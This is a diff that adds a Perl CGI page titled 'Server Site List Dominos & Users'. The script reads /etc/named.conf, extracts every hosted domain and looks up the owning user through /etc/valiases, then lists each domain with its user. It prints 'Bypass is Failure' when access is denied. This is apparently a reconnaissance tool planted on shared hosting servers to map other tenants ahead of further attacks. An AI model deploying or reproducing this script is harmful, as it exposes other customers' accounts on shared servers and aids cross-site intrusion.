@@ -1,0 +1,60 @@
+#!/usr/bin/perl -I/usr/local/bandmin
+print "Content-type: text/html\n\n";
+print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<meta http-equiv="Content-Language" content="en-us" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Server Site List Dominos &amp; Users</title>
+<style type="text/css">
+ 
+.style1 {
+ text-align: center;
+ text-decoration: none;color: red;
+ 
+}
+ 
+.style2 {
+
+    text-align: center;
+    text-decoration: none;color:green;
+
+}
+
+.style3 {
+
+    text-align: center;
+    text-decoration: none;color:white;
+
+}
+
+</style>
+</head>
+
+<body style="background-color: #4A4A4A">
+
+
+<p class="style2">Server Site List Dominos &amp; Users </p>
+
+';
+open (d0mains, '/etc/named.conf') or $err=1;
+@cih = <d0mains>;
+close d0mains;
+if ($err){
+print ('<p class="style1">&nbsp;</p><p class="style1">Bypass is Failure</p>');
+die();
+}else{
+print '<p class="style2">&nbsp;</p>
+<p class="style1">Domains : Users :</p>
+';}
+foreach my $one (@cih)
+{
+if($one =~ m/.*?zone "(.*?)" {/){
+$filename= "/etc/valiases/".$1;
+$owner = getpwuid((stat($filename))[4]);
+print '<p class="style3">'.$1.' : '.$owner.'</p>
+';
+}
+}
+print'</body></html>';
